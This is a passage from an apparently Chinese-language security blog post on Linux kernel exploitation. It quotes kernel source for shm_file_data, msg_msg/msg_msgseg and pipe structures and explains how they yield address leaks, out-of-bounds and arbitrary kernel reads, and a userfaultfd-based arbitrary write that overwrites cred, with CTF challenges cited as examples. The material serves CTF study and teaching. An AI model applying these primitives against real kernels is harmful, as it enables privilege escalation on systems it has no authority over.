class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">shm_file_operations_huge</span> =</span> &#123;</span><br><span class="line">    .mmap        = shm_mmap,</span><br><span class="line">    .fsync        = shm_fsync,</span><br><span class="line">    .release    = shm_release,</span><br><span class="line">    .get_unmapped_area    = shm_get_unmapped_area,</span><br><span class="line">    .llseek        = noop_llseek,</span><br><span class="line">    .fallocate    = shm_fallocate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这里对于关闭 shm 文件，对应的是 <code>shm_release</code> 函数，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">shm_release</span><span class="params">(<span class="keyword">struct</span> inode *ino, <span class="keyword">struct</span> file *file)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">shm_file_data</span> *<span class="title">sfd</span> =</span> shm_file_data(file);</span><br><span class="line"></span><br><span class="line">    put_ipc_ns(sfd-&gt;ns);</span><br><span class="line">    fput(sfd-&gt;file);</span><br><span class="line">    shm_file_data(file) = <span class="literal">NULL</span>;</span><br><span class="line">    kfree(sfd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即当我们进行 shmdt 系统调用时便可以释放 <code>shm_file_data</code> 结构体</p><h3 id="数据泄露-2"><a href="#数据泄露-2" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="内核-text-段地址-2"><a href="#内核-text-段地址-2" class="headerlink" title="内核 .text 段地址"></a>内核 .text 段地址</h4><p>shm_file_data 的 ns 域 和 vm_ops 域皆指向内核的 .text 段中，若是我们能够泄露这两个指针便能获取到内核 .text 段基址，其中 ns 字段通常指向 <code>init_ipc_ns</code></p><h4 id="内核线性映射区（-direct-mapping-area）-1"><a href="#内核线性映射区（-direct-mapping-area）-1" class="headerlink" title="*内核线性映射区（ direct mapping area）"></a><em>*内核线性映射区（ direct mapping area）</em></h4><p>shm_file_data 的 file 域为一个 file 结构体，位于线性映射区中，若能泄露 file 域则同样能泄漏出内核的“堆上地址”</p><h1 id="0x07-system-V-消息队列：内核中的“菜单堆”"><a href="#0x07-system-V-消息队列：内核中的“菜单堆”" class="headerlink" title="0x07.system V 消息队列：内核中的“菜单堆”"></a>0x07.system V 消息队列：内核中的“菜单堆”</h1><p>在 Linux kernel 中有着一组 system V 消息队列相关的系统调用：</p><ul><li>msgget：创建一个消息队列</li><li>msgsnd：向指定消息队列发送消息</li><li>msgrcv：从指定消息队列接接收消息</li></ul><p>当我们创建一个消息队列时，在内核空间中会创建一个 <code>msg_queue</code> 结构体，其表示一个消息队列：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msq_queue structure for each present queue on the system */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kern_ipc_perm</span> <span class="title">q_perm</span>;</span></span><br><span class="line"><span class="type">time64_t</span> q_stime;<span class="comment">/* last msgsnd time */</span></span><br><span class="line"><span class="type">time64_t</span> q_rtime;<span class="comment">/* last msgrcv time */</span></span><br><span class="line"><span class="type">time64_t</span> q_ctime;<span class="comment">/* last change time */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_cbytes;<span class="comment">/* current number of bytes on queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qnum;<span class="comment">/* number of messages in queue */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> q_qbytes;<span class="comment">/* max number of bytes on queue */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lspid</span>;</span><span class="comment">/* pid of last msgsnd */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">q_lrpid</span>;</span><span class="comment">/* last receive pid */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_messages</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_receivers</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">q_senders</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="msg-msg-amp-msg-msgseg：近乎任意大小的对象分配"><a href="#msg-msg-amp-msg-msgseg：近乎任意大小的对象分配" class="headerlink" title="msg_msg &amp; msg_msgseg：近乎任意大小的对象分配"></a>msg_msg &amp; msg_msgseg：近乎任意大小的对象分配</h2><p>当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在内核当中这两个结构体形成一个如下结构的循环双向链表：</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>若是消息队列中只有一个消息则是这样：</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>虽然 <code>msg_queue</code> 的大小基本上是固定的，但是 <code>msg_msg</code> 作为承载消息的本体<strong>其大小是可以随着消息大小的改变而进行变动的</strong>，去除掉 msg_msg 结构体本身的 0x30 字节的部分（或许可以称之为 header）<strong>剩余的部分都用来存放用户数据</strong>，因此内核分配的 object 的大小是跟随着我们发送的 message 的大小进行变动的</p><p>而当我们单次发送<strong>大于【一个页面大小 - header size】</strong>大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与 <code>msg_msg</code> 之间形成如下单向链表结构：</p><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>同样地，单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，因此超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体</p><h3 id="分配（GFP-KERNEL-ACCOUNT）：msgsnd-系统调用"><a href="#分配（GFP-KERNEL-ACCOUNT）：msgsnd-系统调用" class="headerlink" title="分配（GFP_KERNEL_ACCOUNT）：msgsnd 系统调用"></a>分配（GFP_KERNEL_ACCOUNT）：msgsnd 系统调用</h3><p>接下来我们来深入 msg_msg 的内部结构，阅读 msgsnd 源码可知，当我们在消息队列上发送一个 message 时，其首先会调用 <code>load_msg</code> 将该 message 拷贝到内核中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgsnd</span><span class="params">(<span class="type">int</span> msqid, <span class="type">long</span> mtype, <span class="type">void</span> __user *mtext,</span></span><br><span class="line"><span class="params"><span class="type">size_t</span> msgsz, <span class="type">int</span> msgflg)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_queue</span> *<span class="title">msq</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipc_namespace</span> *<span class="title">ns</span>;</span></span><br><span class="line">DEFINE_WAKE_Q(wake_q);</span><br><span class="line"></span><br><span class="line">ns = current-&gt;nsproxy-&gt;ipc_ns;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgsz &gt; ns-&gt;msg_ctlmax || (<span class="type">long</span>) msgsz &lt; <span class="number">0</span> || msqid &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (mtype &lt; <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">msg = load_msg(mtext, msgsz);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//...</span></span><br></pre></td></tr></table></figure><p>而 <code>load_msg()</code> 最终会调用到 <code>alloc_msg()</code> 分配所需的空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> msg_msg *<span class="title function_">load_msg</span><span class="params">(<span class="type">const</span> <span class="type">void</span> __user *src, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"><span class="type">int</span> err = -EFAULT;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">msg = alloc_msg(len);</span><br></pre></td></tr></table></figure><p>阅读 <code>alloc_msg()</code> 源码可以发现，其以 msg_msg 结构体为核心生成如下结构：</p><ul><li>对于大小在【一个页面再减掉作为 header 的 msg_msg 的 size】范围内的数据而言，内核仅会分配一个 size + header size 大小的 object（通过 kmalloc），其前 0x30 大小的部分存放 msg_msg 这一 header，剩余部分用以存放用户数据</li><li>对于大小超出【一个页面再减掉作为 header 的 msg_msg 的 size】范围的数据而言，其会额外生成 <code>msg_msgseg</code> 结构体来存放用户数据，通过 kmalloc 分配，大小为剩余未拷贝的用户数据大小加上 next 指针；该结构体与 msg_msg 的 next 成员形成一个<strong>单向链表</strong>，其前 8 字节存放指向下一个 msg_msgseg 的指针，若无则为 NULL</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> msg_msg *<span class="title function_">alloc_msg</span><span class="params">(<span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">msg</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> **<span class="title">pseg</span>;</span></span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line">msg = kmalloc(<span class="keyword">sizeof</span>(*msg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (msg == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">msg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">msg-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">len -= alen;</span><br><span class="line">pseg = &amp;msg-&gt;next;</span><br><span class="line"><span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">cond_resched();</span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line">seg = kmalloc(<span class="keyword">sizeof</span>(*seg) + alen, GFP_KERNEL_ACCOUNT);</span><br><span class="line"><span class="keyword">if</span> (seg == <span class="literal">NULL</span>)</span><br><span class="line"><span class="keyword">goto</span> out_err;</span><br><span class="line">*pseg = seg;</span><br><span class="line">seg-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">pseg = &amp;seg-&gt;next;</span><br><span class="line">len -= alen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> msg;</span><br><span class="line"></span><br><span class="line">out_err:</span><br><span class="line">free_msg(msg);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="释放：msgrcv-系统调用"><a href="#释放：msgrcv-系统调用" class="headerlink" title="释放：msgrcv 系统调用"></a>释放：msgrcv 系统调用</h3><p>IPC，有“发”自然伴随着有“收”，我们发送消息时该结构体在内核中被创建，相应地在我们接收消息时该结构体将被从内核中释放，通过 msgrcv 系统调用我们可以从指定的消息队列中接收指定大小的消息，内核首先会调用 <code>list_del()</code> 将其从 <code>msg_queue</code> 的双向链表上 unlink，之后再调用 <code>free_msg()</code> 释放 <code>msg_msg</code> 单向链表上的所有消息</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msgrcv</span><span class="params">(<span class="type">int</span> msqid, <span class="type">void</span> __user *buf, <span class="type">size_t</span> bufsz, <span class="type">long</span> msgtyp, <span class="type">int</span> msgflg,</span></span><br><span class="line"><span class="params">       <span class="type">long</span> (*msg_handler)(<span class="type">void</span> __user *, <span class="keyword">struct</span> msg_msg *, <span class="type">size_t</span>))</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    list_del(&amp;msg-&gt;m_list);</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    <span class="keyword">goto</span> out_unlock0;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">out_unlock0:</span><br><span class="line">ipc_unlock_object(&amp;msq-&gt;q_perm);</span><br><span class="line">wake_up_q(&amp;wake_q);</span><br><span class="line">out_unlock1:</span><br><span class="line">rcu_read_unlock();</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(msg)) &#123;</span><br><span class="line">free_copy(copy);</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(msg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bufsz = msg_handler(buf, msg, bufsz);</span><br><span class="line">free_msg(msg);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bufsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="读取：msgrcv-系统调用"><a href="#读取：msgrcv-系统调用" class="headerlink" title="读取：msgrcv 系统调用"></a>读取：msgrcv 系统调用</h3><p>IPC，有“发”自然伴随着有“收”，我们发送消息时该结构体在内核中被创建，相应地，在我们接收消息时 msg_msg 链上的对象上的内容会被拷贝到用户空间，其通过调用 <code>msg_handler()</code> 函数指针完成拷贝，对于 msgrcv 系统调用而言，由如下调用链传入该指针：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SYS_msgrcv()</span><br><span class="line">ksys_msgrcv()</span><br><span class="line">do_msgrcv()</span><br></pre></td></tr></table></figure><p>最终调用的是 <code>do_msg_fill()</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">do_msg_fill</span><span class="params">(<span class="type">void</span> __user *dest, <span class="keyword">struct</span> msg_msg *msg, <span class="type">size_t</span> bufsz)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msgbuf</span> __<span class="title">user</span> *<span class="title">msgp</span> =</span> dest;</span><br><span class="line"><span class="type">size_t</span> msgsz;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (put_user(msg-&gt;m_type, &amp;msgp-&gt;mtype))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">msgsz = (bufsz &gt; msg-&gt;m_ts) ? msg-&gt;m_ts : bufsz;</span><br><span class="line"><span class="keyword">if</span> (store_msg(msgp-&gt;mtext, msg, msgsz))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="keyword">return</span> msgsz;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在该函数中最终调用 <code>store_msg()</code> 完成消息向用户空间的拷贝，<strong>拷贝循环的终止条件是单向链表末尾的 NULL 指针</strong>，拷贝数据的<strong>长度</strong>主要依赖的是 <strong>msg_msg 的 m_ts 成员</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">store_msg</span><span class="params">(<span class="type">void</span> __user *dest, <span class="keyword">struct</span> msg_msg *msg, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">size_t</span> alen;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">seg</span>;</span></span><br><span class="line"></span><br><span class="line">alen = min(len, DATALEN_MSG);</span><br><span class="line"><span class="keyword">if</span> (copy_to_user(dest, msg + <span class="number">1</span>, alen))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (seg = msg-&gt;next; seg != <span class="literal">NULL</span>; seg = seg-&gt;next) &#123;</span><br><span class="line">len -= alen;</span><br><span class="line">dest = (<span class="type">char</span> __user *)dest + alen;</span><br><span class="line">alen = min(len, DATALEN_SEG);</span><br><span class="line"><span class="keyword">if</span> (copy_to_user(dest, seg + <span class="number">1</span>, alen))</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="MSG-COPY：读取但不释放"><a href="#MSG-COPY：读取但不释放" class="headerlink" title="MSG_COPY：读取但不释放"></a>MSG_COPY：读取但不释放</h4><p>当我们在调用 msgrcv 接收消息时，相应的 msg_msg 链表便会被释放，但阅读源码我们会发现，当我们在调用 msgrcv 时若设置了 <code>MSG_COPY</code> 标志位，则<strong>内核会将 message 拷贝一份后再拷贝到用户空间，原双向链表中的 message 并不会被 unlink</strong>，从而我们便可以<strong>多次重复地读取同一个</strong> <code>msg_msg</code> 链条中数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line"><span class="keyword">if</span> ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">copy = prepare_copy(buf, <span class="type">min_t</span>(<span class="type">size_t</span>, bufsz, ns-&gt;msg_ctlmax));</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(copy))</span><br><span class="line"><span class="keyword">return</span> PTR_ERR(copy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If we are copying, then do not unlink message and do</span></span><br><span class="line"><span class="comment"> * not update queue parameters.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (msgflg &amp; MSG_COPY) &#123;</span><br><span class="line">msg = copy_msg(msg, copy);</span><br><span class="line"><span class="keyword">goto</span> out_unlock0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure><h3 id="数据泄露-3"><a href="#数据泄露-3" class="headerlink" title="数据泄露"></a>数据泄露</h3><h4 id="越界数据读取"><a href="#越界数据读取" class="headerlink" title="越界数据读取"></a>越界数据读取</h4><p>在拷贝数据时对长度的判断主要依靠的是 <code>msg_msg-&gt;m_ts</code>，我们不难想到的是：若是我们能够控制一个 msg_msg 的 header，将其 m_sz 成员改为一个较大的数，我们就能够<strong>越界读取出最多将近一张内存页大小的数据</strong></p><h4 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h4><p>对于大于一张内存页的数据而言内核会在 msg_msg 的基础上再补充加上 msg_msgseg 结构体，形成一个单向链表，我们不难想到的是：若是我们能够同时劫持 <code>msg_msg-&gt;m_ts</code> 与 <code>msg_msg-&gt;next</code>，我们<strong>便能够完成内核空间中的任意地址读</strong></p><p>但这个方法有一个缺陷，无论是 <code>MSG_COPY</code> 还是常规的接收消息，其拷贝消息的过程的判断主要依据还是单向链表的 next 指针，因此若我们需要完成对特定地址向后的一块区域的读取，<strong>我们需要保证该地址的数据为 NULL</strong></p><h4 id="内核线性映射区（-direct-mapping-area）-2"><a href="#内核线性映射区（-direct-mapping-area）-2" class="headerlink" title="*内核线性映射区（ direct mapping area）"></a><em>*内核线性映射区（ direct mapping area）</em></h4><p>虽然我们不能直接读取当前 msg_msg 的 header，但我们不难想到的是：我们可以通过喷射大量的 msg_msg，从而<strong>利用越界读来读取其他 msg_msg 的 header</strong>，通过其双向链表成员泄露出一个“堆”上地址</p><p>那么这个“堆”上地址指向哪呢？让我们将目光重新放回 <code>msg_queue</code> 与 <code>msg_msg</code> 结构体之间的关系，当一个消息上只有一个 message 时，我们不难看出 msg_msg 的 prev 与 next 指针都指向 msg_queue 的 <code>q_messages</code> 域，对应地， msg_queue-&gt;q_message 的 prev 与 next 也同样指向 msg_msg 的 <code>m_list</code> 域</p><p><img src="https://s2.loli.net/2022/02/24/sD9xtpaHrQ2uneZ.png" alt="image.png"></p><p>因此我们可以获得到对应的 <code>msg_queue</code> 的地址，相应地，<strong>我们可以将 msg_msg 的 next 指针指回 msg_queue，从而读出上面的指向 msg_msg 的指针，将未知的地址变为已知的地址</strong></p><h4 id="基于堆地址泄露的堆上连续内存搜索"><a href="#基于堆地址泄露的堆上连续内存搜索" class="headerlink" title="**基于堆地址泄露的堆上连续内存搜索"></a>**基于堆地址泄露的堆上连续内存搜索</h4><p>在我们完成对“堆”上地址的泄露之后，我们可以在每一次读取时<strong>挑选已知数据为 NULL 的区域作为 next-&gt;next 以避免 kernel panic</strong>，以此获得<strong>连续的搜索内存的能力</strong>，不过这需要我们拥有足够次数的更改 msg_msg 的 header 的能力</p><p>（例题：<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP/">D^3CTF2022 - d3kheap</a>）</p><blockquote><p>之前例题本来想选一个以前有的 CTF 题来写的（比如说 corCTF），但是<strong>笔者太懒了</strong>…于是一直拖到最近刚好拿这个结构体出了一道 CTF 题，所以就顺便把这个过去开的坑给补充上…</p></blockquote><h3 id="任意地址写（结合-userfaultfd-或-FUSE-完成-race-condition-write）"><a href="#任意地址写（结合-userfaultfd-或-FUSE-完成-race-condition-write）" class="headerlink" title="任意地址写（结合 userfaultfd 或 FUSE 完成 race condition write）"></a>任意地址写（结合 userfaultfd 或 FUSE 完成 race condition write）</h3><p>当我们调用 msgsnd 系统调用时，其会调用 <code>load_msg()</code> 将用户空间数据拷贝到内核空间中，首先是调用 <code>alloc_msg()</code> 分配 <code>msg_msg</code> 单向链表，之后才是正式的拷贝过程，即空间的分配与数据的拷贝是分开进行的</p><p>我们不难想到的是，<strong>在拷贝时利用 userfaultfd 将拷贝停下来，在子进程中篡改 msg_msg 的 next 指针，在恢复拷贝之后便会向我们篡改后的目标地址上写入数据，从而实现任意地址写</strong></p><p>这里借用一张 bsauce 师傅的图来作为🌰说明，图上是将 next 指针劫持到进程的 PCB 上从而修改 cred 指针</p><p><img src="https://s2.loli.net/2022/03/09/p7d1PGVaM6TzmLc.png" alt="来自 bsauce 投稿安全客的文章的图片"></p><p>（例题：corCTF2021 - Fire of Salvation）</p><blockquote><p>笔者还没写 wp，这里先🕳着…</p></blockquote><h1 id="0x08-pipe-管道相关"><a href="#0x08-pipe-管道相关" class="headerlink" title="0x08.pipe 管道相关"></a>0x08.pipe 管道相关</h1><p><strong>管道</strong>同样是内核中十分重要也十分常用的一个 IPC 工具，同样地管道的结构也能够在内核利用中为我们所用，其本质上是创建了一个 virtual inode 与两个对应的文件描述符构成的：</p><p><img src="https://s2.loli.net/2022/03/09/yTX7aREhPwsJIbM.png" alt="非常经典的一张图"></p><h2 id="pipe-inode-info（kmalloc-192-GFP-KERNEL-ACCOUNT）：管道本体"><a href="#pipe-inode-info（kmalloc-192-GFP-KERNEL-ACCOUNT）：管道本体" class="headerlink" title="pipe_inode_info（kmalloc-192|GFP_KERNEL_ACCOUNT）：管道本体"></a>pipe_inode_info（kmalloc-192|GFP_KERNEL_ACCOUNT）：管道本体</h2><p>在内核中，管道本质上是创建了一个<strong>虚拟的 inode</strong> 来表示的，对应的就是一个 <code>pipe_inode_info</code> 结构体（<code>inode-&gt;i_pipe</code>），其中包含了一个管道的所有信息，当我们创建一个管道时，内核会创建一个 VFS inode 与一个 pipe_inode_info 结构体：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 